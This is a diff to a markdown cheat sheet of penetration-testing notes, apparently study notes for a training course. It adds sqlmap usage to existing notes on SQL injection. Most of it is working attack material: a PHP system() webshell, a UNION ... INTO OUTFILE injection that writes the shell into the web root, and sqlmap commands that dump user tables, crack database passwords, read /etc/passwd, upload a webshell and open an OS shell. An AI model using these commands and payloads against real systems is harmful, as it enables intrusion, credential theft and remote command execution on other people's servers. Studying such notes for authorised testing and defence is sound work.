@@ -205,10 +205,141 @@ https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/def
 #### Writing a webshell
 The webshell:
 ```php
-<?php system($_REQUEST[cmd]); ?>
+<?php system($_REQUEST["cmd"]); ?>
 ```
 ```MySQL
 ' union select "",'<?php system($_REQUEST[cmd]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 
 ```
 #### Access the webshell
 Go to the webshell by going to <IP:PORT>/shell.php?cmd=<command>
+
+## SQLMAP
+### Basic Command
+```zsh
+sqlmap -u "http://<IP:PORT>/<vuln.php>?<parameter>=1" --batch
+```
+--batch skips user input by assuming the default.
+
+You can use copy as CURL from the network monitoring tool in browser
+```zsh
+sqlmap <curl command - curl>
+```
+Post Request
+```zsh
+sqlmap 'http://<IP:PORT>/' --data 'uid=1&name=test'
+```
+Copy to File in Burp Suite 
+```zsh
+sqlmap -r request.txt
+```
+Add cookie data with
+```zsh
+-H='Cookie:PHPSESSID=<cookie-data>'
+```
+or
+```zsh
+--cookie='PHPSESSID=<cookie-data>'
+```
+Other methods
+```zsh
+sqlmap -u <IP:PORT> --data='id=1' --method PUT
+```
+
+### Handling SQLMAP Errors 
+Display Errors
+```zsh
+--parse-errors 
+```
+Store Traffic
+```zsh
+-t /path/to/file.txt
+```
+Verbose Output
+```zsh
+-v
+```
+
+Attack Tuning
+
+```basg
+--level=5 --risk=3
+```
+
+Database Enumeration
+```zsh
+--banner --current-user --current-db --is-dba
+```
+Table enumeration
+```zsh
+--tables -D testdb
+```
+Data Exfiltration
+```zsh
+--dump -T users -D testdb
+```
+Dump Specific Columns
+```zsh
+--dump -T users -D testdb -C name,surname
+```
+Full DB Enumeration
+```zsh
+ --dump
+```
+or
+```zsh
+--dump-all --exclude-sysdbs
+```
+DB Schema Enumeration
+```zsh
+--schema
+```
+Searching for Data
+
+-Table
+```zsh
+--search -T user
+```
+-Column
+```zsh
+--search -C pass
+```
+
+Password Enumeration and Cracking
+```zsh
+--dump -D master -T users
+```
+DB Users Password Enumeration and Cracking
+```zsh
+--passwords --batch
+```
+Automagically do the whole enumeration process
+```zsh
+--all --batch
+```
+
+File Read/Write
+Check for DBA Privileges
+```zsh
+--is-dba
+```
+Read File
+```zsh
+--file-read "/etc/passwd"
+```
+Writing File
+Write a Shell like this one
+```php
+<?php system($_REQUEST["cmd"]); ?>
+```
+Write it to the DB
+```zsh
+--file-write "shell.php" --file-dest "/var/www/html/shell.php"
+```
+
+OS Command Execution
+```zsh
+--os-shell
+```
+```zsh
+--os-shell --technique=E
+```
